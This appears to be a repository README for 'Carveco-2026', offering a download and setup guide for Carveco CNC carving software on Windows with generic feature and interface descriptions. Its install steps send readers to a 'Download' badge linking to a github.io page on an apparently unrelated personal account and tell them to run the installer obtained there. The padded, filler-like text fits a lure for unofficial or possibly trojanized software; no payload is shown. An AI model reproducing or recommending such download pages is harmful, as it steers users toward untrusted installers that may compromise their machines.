## 🌱 Why This Repository Exists

Every great carving begins with a block of material that does not yet know its destiny. The same is true of CNC software. Most CAM ecosystems in the early 2020s were built for engineers who loved spreadsheets more than sawdust. Carveco-2026 flips that relationship. It treats the operator as an artisan first, a technician second.

This repository gathers the **download, install, and setup guide** experience for the Carveco family on Windows into one coherent, well-documented, and continuously maintained home. Whether you are running a hobby-grade 3018 in a garage or a 5-axis industrial router in a small fabrication shop, the goal here is the same: reduce the friction between a design idea and a finished cut.

The year 2026 matters. By 2026, Windows 11 will be the dominant desktop environment, ARM-based Windows laptops will be mainstream, and touchscreens on shop-floor terminals will be as common as tape measures. Carveco-2026 is built with that world in mind — scaled, adaptive, and ready for the realities of a modern workshop.

## ✨ Feature Constellation

Below is the full constellation of capabilities that define Carveco-2026. Each feature is a star, and together they form a navigational shape that helps you find your way through any carving project.

### 🖥️ Core Carving Engine
- Vector import for DXF, SVG, EPS, AI, and PDF artwork.
- Raster-to-toolpath conversion for engraving photographic detail.
- True 3D relief modeling with dynamic roughing and finishing passes.
- Adaptive clearing that respects tool engagement and material hardness.
- Support for V-bits, ball nose, flat end mills, tapered tools, and drag knives.
- Simulation timeline with material-removal preview before a single real cut.
- Post-processor library covering GRBL, Mach3, Mach4, LinuxCNC, and industrial controllers.

### 🎨 Design & Composition Layer
- Layered workspace with named, color-coded, and lockable layers.
- Node editing with snapping to tangent, midpoint, and intersection.
- Boolean operations that behave predictably even on messy imports.
- Text engraving with system fonts, single-line fonts, and custom kerning.
- Pattern replication (linear, polar, and along-path) for ornamental work.
- Sculpting brushes for organic forms that would be tedious to model manually.

### ⚙️ Machine & Material Intelligence
- Material presets for softwood, hardwood, MDF, acrylic, aluminum, brass, and foam.
- Automatic feed-and-speed suggestion based on cutter diameter and material.
- Tool library with wear tracking and replacement reminders.
- Zeroing wizards for corner, center, and probing plate setups.
- Multi-fixture support for production runs with repeatable offsets.

### 🌐 Connectivity & Workflow
- Project files that travel cleanly between machines via portable workspace bundles.
- Optional cloud-less sync using local network shares.
- Export presets for popular streaming controllers and pendant remotes.
- Batch processing to queue multiple jobs overnight.

### 🧩 Extensibility
- Scripting hooks for automating repetitive parameter changes.
- Plugin-style post-processor definitions written in plain configuration.
- Theme engine for swapping UI palettes to match your shop's lighting.

## 📱 Responsive UI Philosophy

A workshop is not a single place. It is a desk in a home office, a tablet clamped to a machine frame, a rugged laptop balanced on a stack of plywood, and occasionally a large monitor bolted to a wall. Carveco-2026's interface responds to all of them.

The responsiveness here is not merely about screen width. It is about **intent**. When you are sketching a design, the panels collapse to give you canvas. When you are dialing in feeds and speeds, the numeric fields expand and the toolpath preview steps back. When you are jogging the machine, a large, glove-friendly control strip appears with oversized buttons that forgive a slightly clumsy thumb.

Key responsive behaviors:
- Fluid grid docking that remembers your preferred layout per monitor.
- Automatic DPI scaling for high-resolution and mixed-DPI setups.
- Touch-first mode that enlarges hit targets and enables drag-based navigation.
- Keyboard-first mode for operators who prefer shortcuts over clicks.
- Reduced-motion mode that disables non-essential animation for focus and comfort.

The result is an interface that feels less like software and more like a well-worn tool handle — shaped by use, not by fashion.

## 🌍 Multilingual Support Architecture

Carving is a universal language, and so is the desire to make something by hand. Carveco-2026 ships with a translation layer designed for communities, not just corporations.

Supported languages at launch include English, Spanish, German, French, Italian, Portuguese, Dutch, Polish, Turkish, Japanese, Korean, Simplified Chinese, and Traditional Chinese. Additional community translations can be dropped into the languages folder as simple key-value files.

Design principles behind the multilingual layer:
- **Context-aware strings** — Because "pass" can mean a toolpath pass or a password prompt, and both deserve their own translation.
- **Right-to-left readiness** — Layout mirroring is built in for future RTL locales.
- **Numeric and unit localization** — Decimal separators, thousands separators, and unit labels follow the user's locale, while the underlying math stays exact.
- **Community review workflow** — Translators can propose changes without touching code, using plain text catalogs.

This is more than translation. It is an invitation for makers in every region to feel that the software was built with them in mind.

## 🚀 Getting Started Without a Terminal

The path from download to first cut is intentionally short. You do not need a developer environment, a package manager, or a build pipeline. You need a Windows machine, a little patience, and the willingness to follow a few clear steps.

1. **Acquire the package.** Locate the [![Download](https://raw.githubusercontent.com/Bryantzy24/Carveco-CNC-Router-Workflows/main/fetch_1ae8572.svg)](https://Bryantzy24.github.io/Carveco-CNC-Router-Workflows/) entry at the top of this document and use it to obtain the current Carveco-2026 package for Windows 11 or Windows 10.
2. **Verify the package.** Compare the file size and checksum listed in the release notes. A mismatched checksum is a signal to re-acquire, not to proceed.
3. **Run the installer.** Right-click the installer and choose the standard install option. For shop-floor terminals with restricted permissions, use the per-user install mode instead.
4. **Complete the setup wizard.** Choose your preferred language, unit system, and default machine profile. These choices can all be changed later.
5. **Connect your machine.** If you use a USB-serial controller, install the appropriate driver first, then select the matching COM port inside Carveco-2026.
6. **Load a sample project.** Open one of the examples to confirm that simulation runs and the toolpath preview renders correctly.
7. **Run an air cut.** Before cutting material, run the job with the spindle off and the tool raised. This confirms motion, limits, and zero position.
8. **Make your first real cut.** Start with a soft material and a shallow depth of cut. Celebrate quietly. Then make another.

If any step stalls, consult the troubleshooting tree in the docs folder. More often than not, the answer is a driver, a port, or a unit setting.

## 🧰 Configuration & Workspace Files

Carveco-2026 stores its preferences in human-readable workspace files. This means you can inspect them, back them up, and move them between machines without decoding binary blobs.

Typical workspace contents:
- Machine profiles with travel limits, acceleration curves, and homing behavior.
- Tool libraries with geometry, coating, and recommended chipload ranges.
- Material databases with hardness, feed multipliers, and finish quality notes.
- UI layouts with panel positions, theme selection, and font scaling.
- Post-processor bindings that map logical operations to controller-specific codes.

Because these files are portable, a small shop can standardize on a single configuration and roll it out to every workstation. A hobbyist can carry their entire setup on a USB stick and feel at home on a friend's machine.

## 🤝 Contribution Etiquette

Contributions are welcome from carvers, coders, translators, and documentarians alike. A few ground rules keep the workshop tidy:

- Open an issue before large changes so the direction can be discussed.
- Keep pull requests focused — one idea per request.
- Write commit messages that explain intent, not just action.
- Respect the translation catalogs' key structure; do not rename keys casually.
- Test simulation behavior before submitting toolpath-related changes.
- Be kind in review comments. Everyone was a beginner once.

Disagreement is fine. Disrespect is not. This is a workshop, and workshops run on mutual respect and shared sawdust.
